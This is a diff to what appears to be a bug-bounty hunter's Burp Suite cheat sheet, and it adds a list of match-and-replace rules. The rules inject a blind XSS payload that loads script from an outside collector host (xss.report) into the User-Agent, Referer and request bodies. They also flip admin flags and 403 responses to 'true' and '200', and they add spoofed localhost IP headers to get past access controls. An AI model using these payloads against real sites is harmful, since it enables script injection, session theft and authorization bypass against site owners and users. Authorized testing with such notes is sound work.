@@ -1021,7 +1021,32 @@ Burpsuite
 1-search for =>  Request.Query CONTAINS "=https"	==> for open redirect 
 2- Using Autorize 
 3- open burpsuite and send to intruder and $GET$ then select payloads from library => http verbs
-4- 
+4- use match and replace 
+	- Request header => ^User-Agent.*$ 	=> User-Agent: '"><script src=//xss.report/s/hossamshady1></script>
+	Request header => ^Referer.*$   => Referer: '"><script src=//xss.report/s/hossamshady1></script>
+	Request header => is_admin: false => is_admin: true
+	Response header => is_admin: false => is_admin: true
+	Request header => Origin: hossamshady.me
+	Response header => 403 Forbidden => 200 Ok
+	Response header => admin: false => admin: true
+	Response body => admin: false => admin: true
+	Response body = >disable => enable
+	Request body => hossamxss => '"><script src=//xss.report/s/hossamshady1></script>
+	Request header =>     => Header-Hackerone: hossamshady1
+	Request header		X-Forwarded-Port: 127.0.0.1	
+	Request header		X-Forwarded-By: 127.0.0.1	
+	Request header		X-Forwarded-Scheme: 127.0.0.1	
+	Request header		X-Frame-Options: Allow	
+	Request header		X-Forwarded-For: 127.0.0.1	
+	Request header		X-Client-IP: 127.0.0.1	
+	Request header		X-Real-IP: 127.0.0.1	
+	Request header		X-Originating-IP: 127.0.0.1	
+	Request header		X-Remote-IP: 127.0.0.1	
+	Request header		X-Remote-Addr: 127.0.0.1	
+	Request header		X-Cluster-Client-IP: 127.0.0.1
+	Request header		True-Client-IP: 127.0.0.1	
+	Request header		Client-IP: 127.0.0.1	
+	Request header		Origin: null
 
 --------------------------------------------------------------------------------------------------
 JWT
